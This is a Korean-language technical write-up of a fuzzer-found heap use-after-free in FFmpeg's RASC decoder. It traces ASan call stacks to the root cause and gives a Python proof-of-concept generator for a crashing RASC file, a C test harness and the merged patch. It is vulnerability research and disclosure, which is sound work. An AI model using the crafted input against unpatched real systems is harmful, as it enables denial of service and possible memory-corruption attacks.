# `libavcodec/rasc`: Heap Use-After-Free in `decode_move`

저번 글의 rtspdec 건이 코드 정독으로 잡은 케이스였다면, 이번 RASC 건은 fuzzing이 잡아준 케이스다.
이번 글은 추적 순서를 그대로 따라간다 — 퍼저가 뱉은 ASan 크래시에서 시작해서, 콜스택 세 개를 풀고, 그 라인들로 코드를 거꾸로 짚어가며 루트 코즈를 잡아내는 흐름.

분석은 FFmpeg git HEAD (커밋 `78da965`, master 브랜치) + ASan 빌드 기준으로 진행했다.

## 퍼저 셋업

`libavcodec`의 비교적 사용자가 적을 법한 코덱들 위주로 AFL 하네스를 돌리고 있었다.
FFmpeg 트리에는 `tools/` 아래에 codec별 raw decoder fuzzer 타깃이 있어서, 이를 ASan + UBSan으로 빌드해 stdin으로 입력을 받는 deferred forkserver 모드로 실행할 수 있다.

```bash
# afl-clang-fast + ASan + UBSan으로 빌드된 fuzz target
# (예시) RASC raw decoder 대상
cat input.bin | ./tools/afl_raw_dec_rasc_fuzzer

# 실제 fuzz 세션은 afl-fuzz로 corpus 흘려보내는 식
afl-fuzz -i seeds -o out -- ./tools/afl_raw_dec_rasc_fuzzer
```

여러 codec 동시에 돌리던 와중에 RASC 디코더에서 heap use-after-free가 잡혔다.

## 크래시

AFL 큐에 떨어진 입력을 ASan 빌드에 다시 흘려봤더니 다음과 같은 출력이 나왔다.

```text
==PID==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000000550
READ of size 2 at pc ... in bytestream_get_le16 bytestream.h:94
    #0  bytestream_get_le16           bytestream.h:94
    #1  bytestream2_get_le16u         bytestream.h:94
    #2  bytestream2_get_le16          bytestream.h:94
    #3  decode_move                   rasc.c:254
    #4  decode_frame                  rasc.c:715
    #5  decode_simple_internal        decode.c:448
    ... (decode dispatch frames)
    #N  avcodec_send_packet           decode.c:746

0x611000000550 is located 16 bytes inside of 134-byte region [0x611000000540,0x6110000005c6)
freed by thread T0 here:
    #0  av_freep                      libavutil/mem.c:253
    #1  fast_malloc                   libavutil/mem.c:548
    #2  av_fast_padded_malloc         utils.c:61
    #3  decode_move                   rasc.c:299
    #4  decode_frame                  rasc.c:715

previously allocated by thread T0 here:
    #0  av_mallocz / fast_malloc      libavutil/mem.c:549
    #1  av_fast_padded_malloc         utils.c:61
    #2  decode_zlib                   rasc.c:188
    #3  decode_move                   rasc.c:230
    #4  decode_frame                  rasc.c:715

SUMMARY: AddressSanitizer: heap-use-after-free bytestream.h:94 in bytestream_get_le16
```

처음 보는 시점에선 PoC도 없고 트리거 조건도 모르는 상태다.
ASan이 알려준 세 개의 콜스택(현재 access / 직전 free / 최초 alloc)이 유일한 단서다.

## 콜스택 추적

세 콜스택을 하나씩 풀어봤다.

**1. READ — 현재 access**

```
bytestream_get_le16  →  decode_move  rasc.c:254
```

`mc`라는 `GetByteContext`로 le16 2바이트를 읽다가 freed 영역을 짚었다.
주소 `0x611000000550`는 134바이트짜리 freed region `[0x611000000540, 0x6110000005c6)`의 16바이트 안쪽 — 즉 freed 영역의 시작에서 +16 위치를 읽었다는 뜻.

**2. freed by**

```
av_freep  →  fast_malloc  →  av_fast_padded_malloc  →  decode_move  rasc.c:299
```

같은 `decode_move()` 함수의 라인 299에서 일어난 free.
직전에 `av_fast_padded_malloc`이 호출됐고, 그 안에서 기존 영역을 `av_freep`으로 해제하고 새 영역을 잡은 흐름.

**3. previously allocated by**

```
av_mallocz / fast_malloc  →  av_fast_padded_malloc  →  decode_zlib  rasc.c:188  →  decode_move  rasc.c:230
```

라인 230의 `decode_zlib(...)` 호출이 라인 188의 `av_fast_padded_malloc`을 거쳐 처음 134바이트를 잡아준 자리.

세 콜스택을 종합하면 패턴이 명확하다.
**alloc, free, access 모두 같은 `decode_move()` 함수 안에 있다.**
즉 한 함수 안에서 한 포인터를 alloc → free → 그 포인터를 통한 dangling reference로 read 하는 구조.
보통 이 패턴은 **루프 안에서 buffer를 재할당하면서 그 buffer를 가리키는 iterator를 그대로 두는** 형태에서 나타난다.

라인 188(alloc), 230(alloc 호출), 254(UAF read), 299(free) — 이 네 자리를 코드에서 직접 짚어봐야 했다.

## 취약 코드

`libavcodec/rasc.c`의 `decode_move()`. 함수가 길어서 콜스택이 짚은 네 군데 위주로 발췌한다.

```c
/* libavcodec/rasc.c — decode_move */
/* 222 */     compression = bytestream2_get_le32(gb);
/* ... */
/* 227 */     uncompressed_size = 16 * nb_moves;
/* ... */
/* 229 */     if (compression == 1) {
/* 230 */         ret = decode_zlib(avctx, avpkt,
/* 231 */                           size - (bytestream2_tell(gb) - pos),
/* 232 */                           uncompressed_size);
/* 233 */         if (ret < 0)
/* 234 */             return ret;
/* 235 */         bytestream2_init(&mc, s->delta, uncompressed_size);
/* ... */
/* 249 */     for (int i = 0; i < nb_moves; i++) {
/* ... */
/* 254 */         type = bytestream2_get_le16(&mc);
/* 255 */         start_x = bytestream2_get_le16(&mc);
/* 256 */         start_y = bytestream2_get_le16(&mc);
/* 257 */         end_x = bytestream2_get_le16(&mc);
/* 258 */         end_y = bytestream2_get_le16(&mc);
/* 259 */         mov_x = bytestream2_get_le16(&mc);
/* 260 */         mov_y = bytestream2_get_le16(&mc);
/* 261 */         bytestream2_skip(&mc, 2);
/* ... */
/* 296 */         } else if (type == 0) {
/* 297 */             uint8_t *buffer;
/* 298 */
/* 299 */             av_fast_padded_malloc(&s->delta, &s->delta_size, w * h * s->bpp);
/* 300 */             buffer = s->delta;
/* 301 */             if (!buffer)
/* 302 */                 return AVERROR(ENOMEM);
/* 303 */
/* 304 */             for (int j = 0; j < h; j++) {
/* 305 */                 memcpy(buffer + j * w * s->bpp, e2, w * s->bpp);
/* 306 */                 e2 -= s->frame2->linesize[0];
/* 307 */             }
/* ... */
/* 312 */             }
```

이제 흐름이 보인다.

- **라인 230 → 188**: `decode_zlib` 호출 → 그 안의 `av_fast_padded_malloc(&s->delta, ...)` 으로 134바이트 영역을 할당, `s->delta`가 이를 가리킴.
- **라인 235**: `bytestream2_init(&mc, s->delta, ...)` — 로컬 iterator `mc`의 buffer 포인터가 `s->delta`(= 그 134바이트)를 가리키도록 박힘.
- **라인 249-261**: for 루프 안에서 `mc`로 16바이트씩 (le16 7번 + skip 2) 소비.
- **라인 296-302**: `type == 0` 분기에서 `av_fast_padded_malloc(&s->delta, ..., w*h*s->bpp)` — `s->delta`를 free하고 새로 할당.

마지막 줄이 사고의 원천.
`av_fast_padded_malloc()`는 요청 사이즈가 현재 할당보다 크면 기존 영역을 free하고 새로 할당하는 헬퍼다.
라인 299에서 호출되는 순간, 라인 188이 잡아둔 134바이트가 free된다.
하지만 `mc`는 라인 235에서 이미 `s->delta`(즉 free된 그 영역)를 가리키도록 박혀 있고, 라인 299의 free는 `mc`를 건드리지 않는다 — `mc`는 dangling이 된다.

루프는 거기서 끝나지 않는다.
다음 iteration이 라인 254부터 다시 `bytestream2_get_le16(&mc)` 7번 + `skip 2` 1번 = 16바이트를 freed 영역에서 읽는다.
이게 ASan이 잡은 그 read — `0x611000000550`는 freed 영역의 시작(`0x611000000540`)으로부터 16바이트 위치, 정확히 첫 iteration이 16바이트 소비한 다음 자리.

설령 라인 299의 새 할당이 우연히 같은 주소로 떨어진다 해도 사고가 끝난 게 아니다.
새 `s->delta`는 라인 304-307에서 픽셀 복사용 scratch buffer로 즉시 덮어쓰여서, 다음 iteration의 `mc`는 픽셀 데이터를 move-table 필드로 해석하게 된다.

**트리거 조건 정리:**

1. MOVE chunk, `compression == 1` (zlib 경로)
2. `nb_moves ≥ 2` (최소 2회차 iteration까지 가야 UAF 도달)
3. 첫 move가 `type == 0` (라인 299의 두 번째 malloc 발동)
4. 그 type 0의 `w * h * s->bpp + 64 > s->delta_size` (성장 임계 통과해야 free + realloc)

마지막 조건을 풀어보면, 초기 `s->delta_size`는 134바이트.
`av_fast_padded_malloc`의 성장 공식 `min_size + min_size/16 + 32` 를 `uncompressed_size + AV_INPUT_BUFFER_PADDING_SIZE = 32 + 64 = 96` 에 적용한 결과 (`96 + 6 + 32 = 134`).
32bpp에서 `w * h ≥ 18`이면 임계를 넘는데, 안전하게 `20×20 = 400`을 잡으면 항상 트리거 가능하다.

## 최소 PoC

위 트리거 조건만 만족하면 되니까, 그 조건에 맞춰 가장 짧은 형태의 RASC 페이로드를 직접 짰다 — 131바이트.

```python
import zlib, struct

def u32(v): return struct.pack('<I', v)
def u16(v): return struct.pack('<H', v)

# INIT chunk: sets up 320x240 32bpp frame
# decode_fint expects: peek_le32==0x65, skip 8, width(4), height(4),
#                      skip 30, fmt(2), skip 24
init_data = (
    u32(0x65)           # magic sentinel
    + b'\x00' * 4       # ignored
    + u32(320)          # width
    + u32(240)          # height
    + b'\x00' * 30
    + u16(32)           # 32bpp → AV_PIX_FMT_BGR0, s->bpp=4
    + b'\x00' * 24
)
init_chunk = b'INIT' + u32(len(init_data)) + init_data

# MOVE chunk: compression=1 (zlib), 2 moves
# After zlib inflation, bytestream2_init(&mc, s->delta, uncompressed_size)
# Move 0: type=0, 20x20 copy → av_fast_padded_malloc(&s->delta, ..., 1600)
#   frees s->delta; mc.buffer_start now dangling
# Move 1: bytestream2_get_le16(&mc) → READ from freed s->delta  [UAF]

def move(type, x0, y0, x1, y1, mx, my):
    return struct.pack('<8H', type, x0, y0, x1, y1, mx, my, 0)

raw = move(0,  0, 0, 20, 20, 0, 0)   # type-0: triggers realloc
raw += move(0, 0, 0,  5,  5, 0, 0)   # type-0: reads from freed region

move_data = (
    b'\x00' * 8
    + u32(2)            # nb_moves
    + b'\x00' * 8
    + u32(1)            # compression = 1 (zlib)
    + zlib.compress(raw)
)
move_chunk = b'MOVE' + u32(len(move_data)) + move_data

with open('poc.bin', 'wb') as f:
    f.write(init_chunk + move_chunk)
```

페이로드 구성:

- **INIT chunk** — 320×240, 32bpp 프레임 셋업 (`AV_PIX_FMT_BGR0`, `s->bpp = 4`). 디코더 컨텍스트 정상 초기화.
- **MOVE chunk** — `compression == 1`, `nb_moves == 2`.
  - **Move 0** — `type=0`, 영역 20×20. 라인 299의 `av_fast_padded_malloc(&s->delta, ..., 1600)` 발동시켜 134바이트 inflate 버퍼 free + `mc` dangling.
  - **Move 1** — `type=0`, 영역 5×5. 다음 iteration에서 라인 254-261의 16바이트 read가 freed 영역으로 떨어져 UAF 트리거.

직접 던져 검증할 수 있도록 minimal harness도 같이.

```c
#include <stdio.h>
#include <string.h>
#include "libavcodec/avcodec.h"
#include "libavutil/mem.h"

int main(int argc, char *argv[])
{
    const char *path = argc > 1 ? argv[1] : "poc.bin";

    FILE *f = fopen(path, "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);
    uint8_t *data = av_malloc(sz + AV_INPUT_BUFFER_PADDING_SIZE);
    if (!data) { fclose(f); return 1; }
    if (fread(data, 1, sz, f) != (size_t)sz) { fclose(f); av_free(data); return 1; }
    memset(data + sz, 0, AV_INPUT_BUFFER_PADDING_SIZE);
    fclose(f);

    av_log_set_level(AV_LOG_QUIET);

    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_RASC);
    if (!codec) { fprintf(stderr, "RASC decoder not available\n"); av_free(data); return 1; }

    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) { av_free(data); return 1; }
    ctx->width      = 320;
    ctx->height     = 240;
    ctx->max_pixels = 1024 * 1024;

    if (avcodec_open2(ctx, codec, NULL) < 0) {
        fprintf(stderr, "avcodec_open2 failed\n");
        avcodec_free_context(&ctx);
        av_free(data);
        return 1;
    }

    AVPacket *pkt = av_packet_alloc();
    AVFrame  *frm = av_frame_alloc();
    if (!pkt || !frm) goto out;

    /* pkt->buf stays NULL (no av_new_packet); av_packet_free will not attempt to unref data */
    pkt->data = data;
    pkt->size = (int)sz;

    avcodec_send_packet(ctx, pkt);
    avcodec_receive_frame(ctx, frm);

out:
    av_frame_free(&frm);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    av_free(data);
    return 0;
}
```

빌드 + 실행:

```bash
clang -fsanitize=address -g -O1 -o test_harness test_harness.c \
    -I/path/to/ffmpeg-src \
    -L/path/to/ffmpeg-src/libavcodec \
    -L/path/to/ffmpeg-src/libavutil \
    -lavcodec -lavutil -lz -lm -lpthread \
    -Wl,-rpath,/path/to/ffmpeg-src/libavcodec:/path/to/ffmpeg-src/libavutil

ASAN_OPTIONS=detect_leaks=0 ./test_harness poc.bin
```

이미 AFL 빌드를 가지고 있다면 그쪽 fuzz target에 stdin으로 던져도 동일한 트리거가 나온다:

```bash
cat poc.bin | ./tools/afl_raw_dec_rasc_fuzzer
```

처음 AFL이 뱉은 ASan 출력과 동일한 콜스택이 그대로 다시 나온다 — 트리거 조건이 정확히 맞았다는 확인.

## 패치

위 내용을 정리해서 FFmpeg 메인테이너에게 제보했고, [PR #22992](https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/22992)로 다음과 같이 수정되어 머지됐다.

```diff
--- a/libavcodec/rasc.c
+++ b/libavcodec/rasc.c
@@ -51,6 +51,8 @@
     GetByteContext  gb;
     uint8_t        *delta;
     int             delta_size;
+    uint8_t        *mv_scratch;
+    unsigned int    mv_scratch_size;
     uint8_t        *cursor;
     int             cursor_size;
     unsigned        cursor_w;
@@ -294,10 +296,8 @@
                 b2 -= s->frame2->linesize[0];
             }
         } else if (type == 0) {
-            uint8_t *buffer;
-
-            av_fast_padded_malloc(&s->delta, &s->delta_size, w * h * s->bpp);
-            buffer = s->delta;
+            av_fast_padded_malloc(&s->mv_scratch, &s->mv_scratch_size, w * h * s->bpp);
+            uint8_t *buffer = s->mv_scratch;
             if (!buffer)
                 return AVERROR(ENOMEM);
 
@@ -772,6 +772,8 @@
     s->cursor_size = 0;
     av_freep(&s->delta);
     s->delta_size = 0;
+    av_freep(&s->mv_scratch);
+    s->mv_scratch_size = 0;
     av_frame_free(&s->frame1);
     av_frame_free(&s->frame2);
     ff_inflate_end(&s->zstream);
```

핵심은 `s->delta`가 한 함수 안에서 두 가지 역할을 동시에 맡는다는 점이었다 — inflate된 move-table 백킹 버퍼 (`mc`가 가리킴) + type-0 분기에서 픽셀 복사용 scratch buffer.
이 두 역할이 한 포인터를 공유하다 보니 후자가 전자를 free시키는 충돌이 났다.

픽스는 그 scratch 역할만 떼어내서 `RASCContext`에 별도 필드 `mv_scratch`로 들고 가도록 바꿨다.
`s->delta`는 `decode_move()` 끝까지 그대로 살아있고, `mc`도 따라서 모든 iteration 동안 valid 상태를 유지한다.
함께 `rasc_close()`에서 `s->mv_scratch`도 free하도록 cleanup이 추가됐다.
